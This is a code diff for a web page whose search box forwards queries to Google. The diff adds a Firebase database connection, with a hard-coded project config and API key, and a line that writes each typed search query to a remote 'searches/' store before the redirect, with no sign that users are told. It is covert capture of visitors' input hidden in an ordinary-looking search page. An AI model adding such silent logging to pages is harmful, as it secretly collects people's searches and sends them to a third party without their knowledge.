@@ -1,3 +1,19 @@
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAj3wXRNLj1XEWmHzlJbmAe7yIivEI0Xs4",
+  authDomain: "mindreadt.firebaseapp.com",
+  databaseURL: "https://mindreadt-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "mindreadt",
+  storageBucket: "mindreadt.firebasestorage.app",
+  messagingSenderId: "729775484202",
+  appId: "1:729775484202:web:6ae6a82b35b1915b6c8253"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
 const searchBox = document.getElementById("searchBox");
   
   const suggestions = [
@@ -1278,6 +1294,9 @@ const searchBox = document.getElementById("searchBox");
       const query = searchBox.value.trim();
   
       if (query !== "") {
+        set(ref(db, "searches/" + Date.now()), {
+    name: query
+});
   
           window.location.href =
           "https://www.google.com/search?q=" +
